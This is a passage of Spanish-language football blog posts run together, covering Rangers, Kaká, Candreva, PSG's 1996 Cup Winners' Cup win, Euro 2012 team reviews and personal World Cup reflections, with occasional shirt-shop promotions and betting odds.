regates de fantasía, y de golazos dignos de la más distinguida antología con la camiseta del Santos. Quizá porque sus actuaciones, por aquello del cambio horario y la consecuente nocturnidad, eran un asunto casi clandestino, muchos (mea culpa) no habíamos tomado demasiado en serio a la nueva estrella brasileña.Basta saber que la madera de las que están revestidas las paredes procede del mismísimo Queen Mary para entender el ambiente exclusivo que se respira en esas cuatro paredes.Lo más llamativo en la habitación azul son sus mosaicos, prácticamente inalterados en el tiempo. La estancia está presidida por varios murales en los que se detalla la imagen de los presidentes, entrenadores y   futbolistas más destacados en la historia del club. El más famoso   recopila al puñado de privilegiados que han tenido el honor de portar el   brazalete de capitán en el conjunto escocés. Ilustres como Sandy Jardine, Terry Butcher o Richard Gough (el capitán de las nueve ligas consecutivas) observan a los asistentes desde la altura. Todos protestantes y casi todos escoceses. Pero allí junto a ellos, segundo por la derecha en la fila inferior figura una anomalía. Es Lorenzo Amoruso: italiano y primer capitán católico que haya visto la hinchada protestante del Gers desde la fundación del  club. Amoruso, que aterrizó en el verano del 97 en Escocia con el objetivo de redondear a 10 la impresionante racha del club, recogió el brazalete al año siguiente y consiguió levantar tres ligas y tres copas con los Gers. Varios de esos títulos los ganó enfundado en la recordada camiseta Nike con la línea roja en el pecho.Puedes comprar esta camiseta y cientos más en Classic Football Shirts. Umberto Zapelloni aporta un concepto interesante sobre el asunto Kaká hoy en ‘La Gazzetta dello Sport’ El vicedirector del diario rosa aconseja a los milanistas olvidar a Kaká para poder disfrutarlo al menos un poco. La lectura es punzante. Es una hostia con varias trayectorias que explica de una tacada la decadencia del futbolista, la triste realidad del Milan y el resbalón histórico de Florentino Pérez. Kaká nunca volverá a ser el de 2007, el Milan es una vieja potencia abocada a rebañar las migajas del mercado y Florentino el cráneo privilegiado que pasará a la historia por cerrar el peor fichaje de la historia del fútbol.Cuatro temporadas de naderías bien remuneradas, su dudosa interprtetación de la profesionalidad, mucho banquillo y sus sempiternos regresos ampliamente promocionados por los altavoces afines han convertido a Kaká en un triste reflejo del jugador que fue. El mejor favor que pueden hacerle Berlusconi y Galliani a su afición es prohibirle llevar el  22 a la espalda para no agriar unos recuerdos dulces. Quizá sea lo mejor también para Kaká.Llega al Milan persiguiendo una liebre esquiva, contar como un pipiolo más para el mundial de Brasil. Como esos chavales con los bolígrafos en la solapa cuando asoman a la pista de baile, es evidente que el el brasileño tiene por delante una tarea de seducción complicada. Parte , eso sí, con la ventaja de que el Milan e Italia le necesitan en cierto modo. De que a Allegri no le sobran buenos pies en un centro del campo oxidado. De que la Serie A necesita cromos que brillen para tener algo que idolatrar. Y eso es como el paso de Ricky por Madrid, triste pero cierto. Andar a cuentas, a las matemáticas, no mola un pelo. Hay un paisano que dentro de treinta años y mientras balancea una copa de balón poniendo cara de interesante será tan cínico de cascarle a alguno que lo de esperar carambola en la última jornada a ver si subes o si no bajas era la salsa del fútbol. Que aquello sí. Ese eres tu mismo y ahí, flotando por encima del bien, del mal y del resultado en la quiniela, quedarás tan ancho.Pijadas. Si a falta de un partido estamos así es que llevamos todo el año a uvas en vez de a números. Y se acabará lo que se daba y tendremos uvas en vez de números. Y habrá drama, un montón. ¿O no? ¿O reiremos y descorcharemos al final? Pues el “o no” lleva acostándose cada noche conmigo desde el domingo y no me deja descansar. Porque al que viene nos jugamos la vida y yo todavía no balanceo copas de balón como un idiota.Bueno, alguna balanceo pero ya me entienden.Hoy volvía del trabajo a casa y llamé a mi madre. Siempre le cuento cosas del equipo que ella escucha y rebate con mucha paciencia e inacabable compresión materna. Le digo que quedé el domingo con un amigo para celebrar si nosotros nos metemos arriba o si bajan ellos, cualquiera de las dos cosas y me dice “Vamos, que quedaste para tomar algo” Asiento y me entra la risa, relativizo por un momento y me parezco un poquitín más al que balancea copas de balón nosécuantos años adelante. Hasta que cuelgo, recuerdo para que quedé y vuelve la matemática. El fútbol de última jornada. Esto sí. Giuseppina, Luigi y Maria Grazia. Madre, padre y hermana trabajando en el Bar Derby, que respira los colores del Inter y además de bar les sirve de estanco a los del pueblo. El pelo cortito, simple cepillo, entre un mar de crines exhuberantes y barbas embellecidas al milímetro. ¿El apodo? por un secundario en una serie yanqui que ya nadie recuerda.Hay gente que se crece con la adversidad, pero también hay gente que en los momentos difíciles se deja arrastrar cauce abajo por el río fangoso de lo no deseado, de lo imprevisto, de las cosas que duelen –que en el fútbol son muchas-. Como yo el viernes cuando España perdió. No lloré porque tengo treinta y cuatro años, y aún así los ojos estallaron como una ola contenida que arrastra espuma pero muere mansa al roce justo de los pies. Así somos los que nunca aprendimos a asumir que el fútbol es sólo un deporte. Las derrotas dignas, los extraterrestres de Roswell, las líneas de Nazca, el Triangulo de las Bermudas, el juego por alto de Casillas.Ayer celebré los dos primeros goles de Costa Rica porque a mi lado en el bar había un chico con una camiseta de Uruguay. Quería incomodarlo. Como cuando volvía a casa el viernes y una pareja de bellísimos holandeses con la cara pintada y camisetas perfectamente ceñidas a sus cuerpos robustos –el de ella, con la precisión áurea de sus tetas elevando el escudo y el de él con los hombros rectos dándole dignidad a ese ridículo color que es el naranja- me miraron y gritaron: ¡Cinco! ¡cinco! Es miserable, lo sé, reírme del mal ajeno. Apelé a Conejo, a Cayasso y a Milutinovic. Como si aquellos hombres fueran los míos de siempre. Es legítimo ir con los peores, es una tentación demasiado fuerte. Celebrar los goles de los que están destinados a perder. Los favoritos no son simpáticos, ni siendo los nuestros. Ser de un equipo ganador: aleja de mí este cáliz. Y sin querer España está en ese grupo y por eso el otro día hubo gente que se alegró de que cayéramos ridículamente y yo de alguna manera quise ser de ese equipo desastrado que a veces gana. Como antes. Como Costa Rica que celebraban cada gol como si el fútbol hubiera nacido ayer y fuera a morir mañana. Y la Uruguay de Cavani, de Suarez, de Muslera –el portero con nombre de chica de Ipanema-, de Forlán, de gente así… besando el césped humillados, vencidos por un rival minúsculo pero feliz. Quise ser de Costa Rica.Todo era vulgar en Anselmo Robbiati hasta que la pelota rodaba para rozarle la izquierda. Después el quiebro seco, la esquiva lánguida y la manía por la parábola hacia las esquinas iluminaban a aquel zurdo cerrado que desatascaba la tarde en el Artemio Franchi cuando a Batistuta y Rui Costa se les apagaban las luces. A ‘Spadino’ le gustaba a lo Sabas; entrar con el reloj en marcha y la dinamita bajo el brazo. Arrancar con el apellido a la espalda y rematar beatificado. Cuando la Fiorentina anunciaba Nintendo en el pecho tuvo un suplente que jugaba en modo arcade. Uno de esos jugadores que ya no importan. Nanni Moretti callejea con su Vespa en ‘Caro Diario’ y al pasar por el Spinaceto, una barriada popular de la periferia levantada en los años setenta, se sorprende por no encontrar en sus calles toda la miseria que esperaba. La inmundicia que preñaba la conversación cuando los romanos le hablaban del barrio. Se asombra porque si había conducido hasta allí era movido por el recuerdo de una vieja historia titulada ‘Fuga de Spinaceto’ en la que un chaval huye del barrio miserable para buscarse la vida. Antonio Candreva aprendió a domar balones en esas calles pero a los quince años empaquetó la maleta y se fue a buscar suerte como futbolista lejos de casa. Anoche volvió a romperla con la selección Candreva del Spinaceto, un tipo que bien podría haber sido el protagonista de los recuerdos de Moretti.Terni, Udine, Turín, Cesena, Parma, Livorno… para acabar volviendo a Roma con la Lazio. Antonio Candreva siempre ha sido el último fichaje del álbum en cada edición de las biblias de Panini. El coloca. Siempre al fondo en esa ensalada de ocurrencias presidenciales al filo del fax. La suya ha sido además una historia de superación deportiva. El campo de tierra de Tor de Centi le vio nacer mediapunta pero el fútbol le ha obligado a cincelar su juego en las dos bandas e incluso en el mediocentro. Siempre le salvó la facilidad natural para el asunto y un par de botas cargadas de clase nítida. En el debe siempre la ligereza y la falta de continuidad.Sin embargo, para acabar de curtirse Candreva tuvo que volver a casa y soportar la experiencia más dura de su carrera. En invierno de la 2012 llega cedido y sin cartel a una Lazio que coqueteaba con la contratación de Nilmar u Honda y para más inri lo hace con una etiqueta aun más venenosa asomándole por el cuello: su pasado como simpatizante de la Roma. La grada norte abronca cada vez que el speaker canta su nombre pero el tipo le echa huevos. Cuatro meses de insultos, pitos y trabajo en silencio hasta que la tormenta se calma en abril. Contra el Nápoles, en los emocionantes días posteriores la muerte de Giorgio Chinaglia, el gran goleador celeste, la curva recibe un partidazo de Candreva, que además marca un tanto. Dos domingos después, contra el Lecce, los ultras le llaman a capítulo. “En estos meses has demostrado compromiso. A partir de ahora te dejaremos tranquilo, porque para nosotros has entrado a formar parte de la Lazio” Así funciona, es triste, pero Candreva ha pasado la prueba.Todo rueda desde entonces. Llega el juego y poco a poco las piezas van encajando. El gol emocional en el derbi, el primer viaje a Europa con el equipo, el definitivo contrato en propiedad con la Lazio, los doce tantos en la última temporada. Ahora es el  favorito de una afición desencantada con el equipo, pasa de coloca a primer cromo justo al lado del escudo. Llega también la confianza ciega de Prandelli, correspondida con un gran rendimiento en cada envite y en especial durante la última Confederaciones. Anoche ante los ingleses y a miles de kilómetros del barrio, Candreva bordó el fútbol en un partido de colección. No le ha ido mal para ser del Spinaceto. La sensación era que el rellano en la puerta trasera del Parque de los Príncipes se había desgastado más de la cuenta. Aquel año caminaron por allí, maleta en una mano y gesto de despedida en la otra, Ginola, George Weah, Valdo, Ricardo, Kombouaré y M’Boma. Medio álbum de cromos colgó la azul, roja y blanca y se largó. Y aunque por la alfombra del otro fondo se procurara el desfile de Loko, Djorkaeff y Dely Valdés, el pichichi de Francia, un superclase y un killer, para el día clave la cosa pintaba más negra de lo esperado. El Paris Saint-Germain se dedicó durante toda la segunda vuelta a dilapidar su ventaja frente al Auxerre y en la víspera de la final de la Recopa frente al Rapid de Viena ya había conseguido su propósito. No quiero ni imaginar como estaba la moral del grupo cuando en Heysel, ya sin liga y sin entrenador para el año que viene (la intención declarada era la de no renovar a Luis Fernández), los chavales abrían L’Equipe y se desayunaban con titulares como “Les héros de la F1, les zeros du PSG”…Cada semana y de la mano de Classic Football Shirts, la tienda online especializada en camisetas antiguas, nos acercamos al fútbol con una perspectiva diferente. Lo hacemos desde las camisetas con las que se ha construido la historia del deporte rey.Parece mentira pero pudiendo levantar su primer título europeo a tan solo 25 años vista del nacimiento del club y sabiéndose netamente superiores al Rapid, la plantilla esperaba la cita con una nube negra por sombrero. Quizá por ello, para soplar esa gorra de malos augurios y airear los pensamientos de cada uno, Luis preparó cambios. Se llevó al tenista Yannick Noah, el carisma en persona, a los entrenamientos previos e introdujo novedades de peso en el once, la principal alterar la pizarra y jugarles a los austriacos con tan sólo tres cromos en defensa. Así las cosas, frente a 15.000 hinchas franceses, los que vistieron la icónica camiseta de la franja roja aquella noche fueron Lama, Roche, Le Guen y N’Gotty, Fournier, Bravo, Guérin, Colleter, Raï, Djorkaeff y Loko.El PSG dominó la final de cabo a rabo, pese a la lesión temprana del faro Raï, pero fue en el 29 cuando consiguió transmitir ese desnivel al marcador. También fue en el 29 cuando las puertas del imaginario colectivo de la hinchada capitalina se abrieron para Bruno N’Gotty. Mole sobre todo, el francés se guardó el derechazo más duro de su carrera para ese momento. A treinta metros de la portería y cuando la lógica demandaba a Djorkaeff para la tarea, el cuatro cambió roles con su compañero y recibió de este en corto. Violencia en el pie y chutazo siempre acariciando la hierba, N’Gotty hacía el gol de su carrera y cimentaba el único título europeo en la historia del club. Un par de manos de Lama más tarde el club era campeón de Europa y esta vez sí el desayuno con L’equipe al día siguiente, “La Consagración” se pudo leer, fue el más dulce de su vida.Puedes comprar esta camiseta, y miles más, en Classic Football Shirts. Las puertas del pánico. Cada vez que echo un vistazo al periódico y veo la penosa racha de resultados en que cabalga la Real Sociedad desde hace más de un mes recuerdo aquella desopilante prueba de Humor Amarillo en la que un puñado de chinos se jugaba el físico intentando atravesar una serie de puertas que podían ser de papel o, aquí llegaba la diversión, de la más robusta madera. Y veo a un oriental enfundado en la zamarra txuriurdin romperse la crisma contra el acceso equivocado una y otra vez. Cinco para ser exactos desde que arañaran un empatito frente al Levante en Anoeta a primeros de marzo. y en realidad siete sin ganar desde que sometieran al Mallorca cuando la primavera todavía se veía lejana. Dice Martín Lasarte, cada vez más cuestionado, que confía en la salvación, que no hay motivo para el pánico.Pocos rivales como el Barcelona, sin embargo, para excitar la competitividad de los jugadores, y más considerando que  el año pasado el Barça apenas rascó un punto del Pizjuán, y el sevillano ha sido el único equipo en la temporada liguera que ha sacado botín del Camp Nou. Paradójicamente, hoy no estará sobre el césped el héroe de aquel día, Javi Varas, y sí lo hará el veterano Palop, en quien Míchel parece confiar más. Por demás, el Sevilla afronta el partido con la plantilla casi al completo, una vez recuperados Medel, Spahic, Navas, Negredo y el eterno Frédéric Kanoute.Partido de pronóstico más incierto de lo que suele habitual con el Barcelona de por medio. La victoria local se paga en bwin a 7,75, el empate –opción muy interesante- a 5,00 y la victoria azulgrana a 1,35. No es descabellado pensar en un partido con dos goles, que se paga a 4,25, o tres goles, que se pagan a 4,00, y una buena opción podría ser combinar ambas apuestas. Un gol de Manu del Moral se paga a 3,75, de Baba a 4,00 y de Jesús Navas, en buena forma, a 4.25. Finalmente, si el Sevilla abre el marcador, el rédito será de 3,50, y de 3,90 si los hispalenses son los primeros en marcar en la segunda mitad. Muchas opciones. No pasará a la historia por su espectacularidad el primer partido del Mundial de 1970, que disputaron el equipo anfitrión y la Unión Soviética, pero sí por dos curiosidades: fue el primer partido en el que un jugador resultó amonestado vía tarjeta amarilla –“honor” que cupo al defensor ruso Evgeni Lovchev– y el primer cambio, en el que Pusach sustituyó a Serebrianikov tras la reanudación. Curiosamente, fue un campeonato bastante limpio en el que no hubo que expulsar a nadie. Os ofrecemos imágenes del partido, aunque desgraciadamente no aparezcan los eventos a los que nos referimos. El incomparable Pelé nos dejó dos perlas en el Mundial de México que, a pesar de resultar finalmente fallidas, la memoria ha conservado sobre todo por la audacia que conllevó su intento. Por un lado (minuto 0:25 del video), en el partido contra Checoslovaquia, vio adelantado al guardameta Viktor y se jugó una vaselina desde el centro del campo que se escapó por centímetros; una suerte habitual en la actualidad, pero rompedora en aquel momento, que O’Rei confesó haber pensado tras ver videos de los porteros europeos. Unos días después (minuto 5:00), frente a Uruguay, dejó pasmado a Mazurkiewicz regateándolo sin tocar el balón, algo pocas veces visto antes o después. Aunque su disparo salió fuera, la jugada no ha perdido ni un ápice de brillantez estética. Y de postre, la parada de Banks (minuto 1:20), que se comenta por sí sola. Pocos recordarían este encuentro, un cuarto de final perdido en un Mundial de hace más de cincuenta años, si no fuera porque sigue marcando el tope de goles conseguidos en un solo partido. Se enfrentaba la Austria post-Sindelar donde brillaban nombres famosos como Hanappi, Happel o Körner con una Suiza que ejercía de organizadora y había dejado a Italia en la cuneta.Un futbolista del que sólo teníamos referencias por sus partidos en el continente americano y del que habitualmente sólo podíamos degustar pequeños ramalazos sobredimensionados en forma de highlights despertaba, como poco, alguna sospecha sobre su futuro rendimiento en el fútbol europeo.La Copa Confederaciones de 2013 será para siempre la Copa Confederaciones de Neymar. El 10 de la canarinha fue sumando y sumando, acaparando protagonismo de manera natural, sin aspavientos, simplemente con buen juego y con ascendiente sobre sus compañeros de equipo. La Confederaciones fue el primer torneo internacional en el que el jovencísimo futbolista paulista se dio a conocer a todo el planeta de manera oficial, con una actuación hiperbólica al frente de la selección brasileña, restallando como un látigo en la gran final ante España y martilleando sin misericordia la conciencia de todos aquellos que, sólo unos meses atrás, desconfiábamos de su potencial real ante equipos del más alto nivel. Fernando Torres. Mientras la historia de amor de Torres y el Atlético de Madrid se marchita semana tras semana, el delantero fuenlabreño aún tiene episodios inolvidables que ofrecer a su afición. El sábado ante el Eibar consiguió, casi quince años después de anotar el primero, su gol número cien con la camiseta de su equipo del alma. Después de permanecer durante cinco meses sin ver puerta.Luka Modric. El Madrid de Zidane es el Madrid de Modric. Ausente Cristiano, el croata se ha erigido en el gran salvador de los blancos a fuerza de carácter con la pelota en los pies y haciendo gala de ese irresistible gen competitivo inherente a cualquier deportista balcánico. En Granada no solo fue decisivo batuta en mano, sino que cuando fue necesario se marcó un solo de violín para colocar la pelota en las redes de Andrés. Parece el madridista más concienciado de lo delicado de la situación de su equipo.Daniel Wass. Al Celta de Nolito, Aspas, Orellana o Guidetti de vez en cuando se le une algún invitado especial. Wass llegó el pasado verano con la compleja misión de hacer olvidar a Michael Krohn-Dehli. A su calidad en el centro del campo, ha unido una versatilidad que es un salvavidas para cualquier técnico. Contra el Sevilla, Berizzo decidió trasladarlo a la banda derecha para dar entrada a Marcelo Díaz y desde ahí surgió el gol del empate celeste. Actívisimo desde una posición que no era la suya.Juanpi Añor. El venezolano del Málaga tuvo una participación prácticamente residual hasta el parón navideño. Tras la salida de Nordin Amrabat, Javi Gracia comenzó a contar con el atacante zurdo con mayor asiduidad hasta convertirse, a día de hoy, en indiscutible en los onces malacitanos. Su concurso coincide además con la innegable mejoría de los costasoleños. Otro gol ante el Getafe, para completar su tercera jornada consecutiva marcando.Charly Musonda. Solo ha necesitado los noventa minutos de su partido de debut como futbolista del Betis para ganarse al Villamarín.Parecía que los helvéticos pasarían fácil cuando Hügi lograba el 3-0 en el ecuador de la primera, pero diez minutos de locura austriaca y cuatro chicharros daban la vuelta al marcador. Los jugadores se iban a descansar con un inverosímil 5-4 para los visitantes, y la ventaja acabó ampliándose hasta el irrepetible 7-5 final. Austria fue despedaza por en semifinales (6-1) por la Alemania de Fritz Walter y acabó siendo tercera, mientras que los anfitriones se fueron a casa con el orgullo intacto, en su mejor actuación en una Copa del Mundo hasta la fecha. Qué tiempos. España. Campeón. Cuatro partidos ganados y dos empatados. Doce goles a favor y uno en contra. Goleadores: Torres (3), Cesc (2), Silva (2), Xabi Alonso (2), Navas, Alba y Mata.Lo mejor. La obra de arte que fue la final contra Italia, quizá el mejor partido de la historia de la selección española. También la competitividad mostrada y la solvencia de la línea de zagueros.Lo peor. La ausencia de ambición atacante en varios de los partidos y el exceso de horizontalidad del juego (excepto en la final), que convirtió por momentos a la Roja en uno de los equipos más aburridos de la Eurocopa.La estrella. Disfrutando por fin del mejor tono físico en un torneo de selecciones, Andrés Iniesta se echó al equipo a la espalda en los peores momentos de zozobra y sufrimiento, frente a Italia, Croacia y Portugal. Su foto rodeado de defensores es un icono del torneo. MVP oficial.El momento. En los penaltis contra Portugal, y considerando el precedente de la Champions League, se puede decir que Sergio Ramos se jugó su carrera en un segundo. Nunca sabremos cuánto de su inmensa valentía se contagió a los demás, pero el resultado está ahí.Italia. Subcampeón. Dos partidos ganados, tres empatados y uno perdido. Seis goles a favor y siete en contra. Goleadores: Balotelli (3), Di Natale, Pirlo y Cassano.Lo mejor. La actitud descarada mostrada por el equipo durante todo el campeonato, los arrestos de Prandelli para llenar el centro del campo de peloteros y su apelación a la deportividad.Lo peor. Quizá no haber valorado correctamente el potencial de España en la final, y no haber suavizado su propuesta para impedir que los centrocampistas españoles no dispusieran de tanto balón. Lo pagaron caro.La estrella. El esplendoroso torneo de Pirlo corona una temporada inolvidable del cerebro de la Juve. Su actuación en cuartos y semifinales sólo está al alcance de esos escasos jugadores para los que el fútbol transcurre en la cabeza antes que en el verde. Genio.El momento. El pase en profundidad de Montolivo que recibe Balotelli frente a Alemania, seguido de desmarque, control y fusilamiento. Italia plantaba sus reales, y se redimía un buen delantero tan discutido como impresentable.Croacia. Primera fase. Un partido ganado, otro empatado y otro perdido. Cuatro goles a favor y tres en contra. Goleadores: Mandzukic (3) y Jelavic.Lo mejor. Sensación de equipo cuajado y difícil de vencer, futbolistas técnicos y de toque y un orden táctico muy poco habitual entre los equipos de la ex-Yugoslavia. Rozaron la clasificación en un grupo que incluyó a los dos finalistas.Lo peor. El primer tiempo contra Italia, en el que fueron desarbolados por el ímpetu azzurro, y quizá no haber soltado un poco antes el freno de mano frente a España, cuando se lo jugaban todo y daba igual perder por uno o por tres.La estrella. Aunque Modric rayó a buen nivel, el croata de la Euro ha sido Mandzukic, uno de esos goleadores que viven un poco al margen del equipo y que en torneos cortos se salen con cierta frecuencia. Metió casi todo lo que tocó.El momento. Si el sevillista Rakitic hubiera resuelto algo mejor el cabezazo franco que le sacó Iker, muchas cosas hubieran cambiado. Y no sólo para Croacia.Irlanda. Primera fase. Tres partidos perdidos, con un gol a favor y nueve en contra. Goleador: Sean St. Ledger.Lo mejor. Es casi imposible rescatar algo meramente futbolístico de la peor selección del torneo, así que nos quedaremos con el apoyo del maravilloso público irlandés, inasequible al desaliento. Disfrutaron como muchos vencedores no lo hacen.Lo peor. Bastante hizo Trapattoni para que un conjunto de jugadores de este nivel llegaran a la fase final de la Euro. Juego primario, técnica deficiente y endeblez defensiva convirtieron a Eire en presa fácil para sus tres rivales, netamente superiores. Muy por debajo de su nivel McGeady y Damien Duff.La estrella. Nadie parece dispueso a recoger el testigo de los Brady, Cascarino, Aldridge y compañía, y el mejor candidato, McClean, apenas rascó bola, así que nos quedamos con la verticalidad de Andrews en el choque contra Italia.El momento. El cabezazo de St. Ledger que empataba el partido frente a Croacia, único insta del nte del torneo en que los verdes parecieron capaces de algo. Falta lateral y remate en escorzo, puro sabor de las Islas. Se jugaban hoy Uruguay y México la clasificación para la segunda fase en un partido en el que el empate valía a ambos, y las dos selecciones americanas se han batido con gallardía por la victoria. Esta situación trae a la memoria lo que fue su reverso tenebroso, el Alemania-Austria del Mundial 82. Quizá el más bochornoso partido nunca visto en un Mundial, en el que el 1-0 prontamente logrado por Hrubesch clasificaba a los dos vecinos –dejando fuera a Argelia- y donde ninguno de los dos equipos hizo lo mínimo por ganar en más de tres cuartas partes del partido. El cántico “Que se besen” es historia del torneo, y también la gorra de Schumacher, indicada por algunos como señal del pacto. El reportaje que adjuntamos indigna aún, casi treinta años después. La fábrica de chocolate. Hubo un tiempo en que la Masía era conocida como factoría de medios centros a nivel planetario. Salvo con algunas excepciones como el gran Puyol, alguien en la cartera barcelonista tiraba de varita e implementaba en el cerebro de los chavales las variables necesarias para dirigir el juego, bien desde la calma (Milla), la sobriedad (Busquets), el primer toque (Pep) o el pase corto (Xavi). Como muy bien nos cuenta el amigo Martí Perarnau “en Senda de campeones”, la producción blaugrana se ha diversificado, y quizá no ande lejos el día soñado por la culerada de alinear once canteranos.Pero soy de España. Y lo del viernes, cómo escuece aún por más helado que coma en esta tarde calurosa de primavera que muere en el regazo del verano, por más que pienso en que es posible aún y que la matemática me dé la razón pero el fútbol me hable con palabras severas de padre tras ver las notas. Por más poesía que logre arrancarle a este deporte; por más que le de la vuelta a la guía del As para no leer “España defiende corona” y me den ganas de lanzarla por la ventana junto con las Líbero, las Panenka y el libro de Fitzgerald que no tiene la culpa de nada pero del que no logró pasar del cuarto capítulo.Por eso cuando Maxi Pereira pegó esa patada brutal, repugnante, esa patada sin sentido, miserable, ese anti futbolístico gesto de mal perdedor, de persona execrable, yo estuve un poco con él. Yo le di la razón y dije: bien Maxi, bien. Basta ya de que pierdan el tiempo y se rían de ti y de tu inminente derrota. Y me sentí ahí con él como en una comunión innoble, como miembro una pandilla macarra en la que estamos todos los perdedores en una caterva peligrosa como en un bar de Terciopelo Azul esperando salir a la calle a hacer daño a los demás. Y me sentí, mirando atrás, como Cardozo fallando el penalti, o Buffon recogiendo el balón tras el cuarto gol en la final de la Eurocopa, como Khedira incapaz de interceptar a Puyol antes del cabezazo, como Robben tras el mano a mano con Casillas, como Eduardo despejando el primer lanzamiento de Villa pero incapaz de llegar al rebote. Con todos ellos, perdedores ennegrecidos por el tiempo, en la cuneta de la historia. Y me sentí extrañamente bien en su fiesta siniestra. Todo tras el cinco a uno. Y dejé de celebrar los goles de Costa Rica y puse mi mano en el hombro del uruguayo y le dije: pasáis seguro. Y él me miró, contrariado y sin cariño, y me apartó la mano con más educación de la que yo merecía.Nunca se aprende a perder y está bien así. Croacia, España, Uruguay, Grecia… la felicidad como un péndulo. Perder siempre nos supera porque en el corazón de este deporte siempre está el sueño de ganar. Aún siendo la peor Selección del mundo, cuando corres tras el balón tienes la fe en marcar el gol que de la victoria. El motor del fútbol es el deseo innegociable de derrotar al rival. Hay tanto en juego cuando rueda la pelota. Es tan cruel, tan insano y tan despiadado este animal con dientes afilados al que nos exponemos con docilidad, al que nos ofrecemos como sacrificio, al que llamamos con cariño “fútbol”. Maxi Pereira, la patada como catarsis. Llevar la pelota a la esquina para perder el tiempo. La rueda de prensa de Del Bosque. La celebración de Van Gaal. El centro de Candreva. Rooney atusándose su recién estrenado flequillo. El fútbol, qué deporte. Saber perder, qué utopía. Common people. Gente común. Trocitos de vulgaridad. También en el fútbol hay un espacio para ellos, aunque a veces no se lo queramos perdonar. Tanta cotidianidad chirría entre crestas y tatuajes, entre salidas de tonos y frases fuera de contexto. Como una pandilla de modernos que no entiende los polos rojos y las camisetas de Springfield. Empieza la Liga Española: uno de esa especie llega, otro se va. Rafa Benítez y Pedro son aburridamente estándares. No hay nada en ellos comprometedor, nada nos hace ruborizarnos un poco, nada nos permite mirarles con condescendencia y paternalismo. No son Alves ni Mourinho, no son Cristiano o Bielsa, hay en ellos una simplicidad que casi insulta, una sencillez que difícilmente parece impostada.El fútbol se ha convertido en un plató más. Pedro y Benítez son tan diferentes como aburridos. Me pregunto si a veces no les perdonamos esa actitud indolente fuera del césped. Porque dentro son uno más, con la misma pasión que el resto. Quizá más.Aunque los números que está despachando no son sino un heraldo de lo contrario.Salvando a Bravo, portero solvente cuando está en forma, ayer ante el Atlético la Real volvió a exponer todo el catálago de deficiencias que le han puesto en el disparadero. Una defensa blanda como el talco, a la altura de la del Málaga y ya es decir, enormes carencias en la construcción del juego y un ataque desasistido e inoperante al que solo quiso inyectar cierta chicha la entrada de Zurutuza, incomprensiblemente suplente, en la segunda mitad. Si al paisaje le añadimos que Lasarte está perdiendo la confianza en el patrón táctico que les llevó a ilusionar en la primera vuelta del campeonato y el que, al fin y al cabo, les ha dado el colchón que puede amortiguar su caída… Apaga y vámonos. Quizá tenga razón el técnico cuando afirma que la situación es la normal para un recién ascendido pero ni los números, un punto de los últimos veinticinco, ni un calendario repleto de caramelos envenenados (Sporting, Athletic, Barcelona, Valencia, Zaragoza, Sevilla y Getafe) invitan al optimismo. Uno escucha el rumor de que David Beckham podría regresar a la Premier League para jugar un par de meses a préstamo en el Tottenham (hasta que la MLS retome la actividad el 11 de Marzo) repasa el historial del campeón inglés y anticipa una nueva raza de deportista: la vieja gloria itinerante. Imaginen al dueño de tal o cual cromo bajando del carromato mientras amarra en corto al ejemplar presto a facturarlo por horas a cualquier lugar ante el alborozo de la clientela. ¡Es capaz de vender 100 camisetas en una hora! En el extremo opuesto, el mercenario dispuesto a arrancar un sobresueldo donde corresponda. Seguro que las posibilidades comerciales de la jugada hacen babear a más de un tycoon mercachifle metido a presidente de fútbol.Como parece que la negociación está llegando a los famosos flecos Harry Redknapp se ha apresurado a entonar una cantinela que se debería enseñar en las escuelas de entrenadores: el discurso Beckham. El mismo al que se agarró Galliani hace un tiempo. Que si finalmente se ficha al siete será únicamente por lo que pueda aportar al juego del equipo, que el blondo interior ejercería una gran y positiva influencia en los canteranos, que garantizaría la cuota de calidad en el centro del campo y mi favorita que, parece el único futbolista con amor por la sudoración, es un currante ¿Que va a decir? Obviamente no remarcará que el ex-capitán de Inglaterra lleva cinco temporadas rogando un retiro dorado en la selección. Cinco temporadas tan discretas, entre lesiones y cesiones , como cabe esperar de un futbolista que paso la treintena hace tiempo. Tampoco mencionó la atención mediática y comercial que espera recibir el club a cambio. Sería levantar las cartas. Es como el frutero, nunca te va a confesar que esa naranja tan perfecta es tan insípida como una acelga lavada.Y es que realmente no imagino cuanto de bueno puede aportar David Beckham a un club que ya está jugando su mejor fútbol en años. E imagino que gran parte de la hinchada opina lo mismo. “Es uno de los futbolistas más sobrevalorados que ha habido en mucho tiempo (…) tenemos un buen equipo y estamos haciendo una buena temporada. Si queremos continuar teniendo un equipo con jugadores que luchen por el puesto no necesitamos a una prima donna que solo se interese por si mismo (…) Sí, es bueno centrando pero eso fue hace tiempo”. Al aparato Bernie Kingsley, presidente de la asociación de aficionados del Tottenham. Mi pregunta es ¿Puede un futbolista que deambula sin pena ni gloria por el campeonato americano ofrecer algo más que un reclamo publicitario en uno de los campeonatos más exigentes del mundo? Claro que me pregunté lo mismo hace dos años y la respuesta sigue en el aire. No hay nada más divertido en el fútbol que la anomalía. El indisciplinado que juega y juega, aquel gigantón que tenía seda en las botas, el esmirriado con vocación de gacela o el infraclub que un buen día asoma la cabeza. A menudo pienso que son estos pedacitos del imaginario futbolístico los que hacen que merezca la pena seguir prestando atención al juego. Y anómalo sin duda alguna fue aquel Panathinaikos subcampeón de Europa en 1971. Dicen que la Dictadura de los Coroneles que gobernaba Grecia a punta de cañón en aquel momento influyó definitivamente en la gesta. Es más que probable pero lo cierto es que en 1971 sólo el Ajax prodigioso de Cruijff y Neeskens, en un Wembley abarrotado, les pudo enseñar el camino a casa. En aquel Panathinaikos que entrenó Puskas, Antoniadis era el funcionario que depositaba la pelotita en la red con diligencia y Mimis Domazos, la leyenda del fútbol griego, el encargado de levantar al respetable de sus asientos. De modo que, aprovechando la coyuntura, vaya con este vídeo del genial regateador heleno, un homenaje a aquellos hombres de verde. Y de paso, a la divertida anomalía. Desde que Diego Armando Maradona se aficionara a driblar a cuanto humano le saliera al paso han ido apareciendo émulos del barrilete original hasta debajo de las piedras. Estuvo el de los Cárpatos, el japonés, un señor ya talludo que se hacía llamar el Maradona de la Rambla. Como piezas en la cadena de montaje la cultura popular nos escupe un Maradona cada cierto tiempo. Les digo más, tanto pesa el cromo argentino en el imaginario futbolístico mundial que si usted es la atracción de su casa por esa rara habilidad entre fogones terminará siendo conocido como el Maradona de la Croqueta en todo el bloque. Fijo. Ha habido tanto “10” que cuando aterricé el otro día en un foro dedicado a glosar la obra del Maradona griego mi primera reacción fue de indiferencia. Y anduve a camino entre la sospecha y la risa hasta que comencé a ver vídeos. Y así, uno tras otro, entendí que era cierto el mito, que Grecia también había disfrutado de su pelusa local. De un jugador tan ochentero, carne de parabólica y 